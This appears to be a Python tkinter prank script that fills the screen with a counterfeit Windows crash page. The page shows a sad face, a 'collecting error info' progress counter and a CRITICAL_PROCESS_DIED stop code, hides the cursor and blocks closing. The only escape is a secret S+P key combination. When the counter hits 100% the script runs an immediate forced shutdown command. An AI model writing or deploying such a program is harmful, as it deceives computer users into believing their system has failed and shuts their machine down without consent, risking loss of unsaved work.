try:
    import tkinter as tk
    from tkinter import messagebox
    import math
    import random
    import time
    import ctypes
    import os
except Exception as err:
    print(err)


Configuration = {
    'HasKeyBinds' : True,
    'Binds' : 'S + P to force exit.'
}
    
KeyDownP = False
KeyDownS = False
win = None
percent_compl = None

curr_per = 0

class UI:

    
    Colors = {
        'darkgrey' : '#5A5A5A',
        
    }
    
    def Create(self, nui=1):
        global win
        global percent_compl
        win = tk.Tk()
        win.geometry(f'{win.winfo_screenwidth()}x{win.winfo_screenheight()}')
        win.title('UI test')
        win.config(bg='#0079D9')
        win.overrideredirect(True)
        win.resizable(True, True)
        win.protocol("WM_DELETE_WINDOW", UI.NoClose)
        win.config(cursor="none")
        
        win.bind('<KeyPress-p>', lambda e: self.UpdateKey(UI,'p', 'down', win))
        win.bind('<KeyRelease-p>', lambda e: self.UpdateKey(UI,'p', 'up', win))
        
        win.bind('<KeyPress-s>', lambda e: self.UpdateKey(UI,'s', 'down', win))
        win.bind('<KeyRelease-s>', lambda e: self.UpdateKey(UI,'s', 'up', win))
        
        icon_sad = tk.Label(win, bg='#0079D9',fg='white', text=':(', font=("Segoe UI", 120, ""))
        icon_sad.pack()
        icon_sad.place(relx=.2,rely=.325,anchor='center')
        
        text_problem = tk.Label(win,bg='#0079D9',fg='white', wrap=False,text='Your PC ran into a problem and needs to restart. We\'re', font=("Segoe UI Light", 30, ""))
        text_problem.pack()
        text_problem.place(relx=.42,rely=.47,anchor='center')
        text_problem.config(width=50, height=0)
        
        text_problem2 = tk.Label(win,bg='#0079D9',fg='white', wrap=False,text='just collecting some error info, and then we\'ll restart for you.', font=("Segoe UI Light", 30, ""))
        text_problem2.pack()
        text_problem2.place(relx=.44,rely=.53,anchor='center')
        text_problem2.config(width=50, height=0)
        
        percent_compl = tk.Label(win,bg='#0079D9',fg='white', wrap=False,text='0% Complete', font=("Segoe UI Light", 30, ""))
        percent_compl.pack()
        percent_compl.place(relx=.235,rely=.62,anchor='center')
        percent_compl.config(width=20, height=0)
        imagesnw = tk.PhotoImage(master=win ,file="assets/img/qr.png")
        qrcode = tk.Label(win, image=imagesnw, bg='#0079D9')
        qrcode.pack()
        qrcode.place(relx=.205,rely=.75,anchor='center')
        
        more_info = tk.Label(win,bg='#0079D9',fg='white', wrap=False,text='For more infomation about this issue and possible fixes, visit https://www.windows.com/stopcode', font=("Segoe UI Light", 17, ""))
        more_info.pack()
        more_info.place(relx=.49,rely=.715,anchor='center')
        more_info.config(width=80, height=0)
        
        call_supp = tk.Label(win,bg='#0079D9',fg='white', wrap=False,text='If you call a support person, give them this info:', font=("Segoe UI Light", 15, ""))
        call_supp.pack()
        call_supp.place(relx=.35,rely=.755,anchor='center')
        call_supp.config(width=40, height=0)
        
        stopcode = tk.Label(win,bg='#0079D9',fg='white', wrap=False,text='Stop code: CRITICAL_PROCESS_DIED', font=("Segoe UI Light", 13, ""))
        stopcode.pack()
        stopcode.place(relx=.317,rely=.7825,anchor='center')
        stopcode.config(width=30, height=-5)
        
        win.after(random.randint(1500,3000), UI.CountUp)
        
        win.mainloop()
        
    def UpdateKey(self, key, typ, win):
        global KeyDownP
        global KeyDownS
        if key == 'p':
            if typ == 'down':
                KeyDownP = True
            else:
                KeyDownP = False
        if key == 's':
            if typ == 'down':
                KeyDownS = True
            else:
                KeyDownS = False
                
        if KeyDownP and KeyDownS:
            win.destroy()
            
    def NoClose():
        pass
    
    def CountUp():
        global curr_per
        
        if curr_per < 100:
        
            curr_per += 1
        
            percent_compl.config(text=f'{curr_per}% Complete')
        
            win.after(random.randint(50,400), UI.CountUp)
        
        else:
            os.system("shutdown /s /t 0")


def Start():
    UI.Create(UI, 0)


if __name__ == '__main__':
    messagebox.showerror('Error', 'This module requires a call from pycmd.py')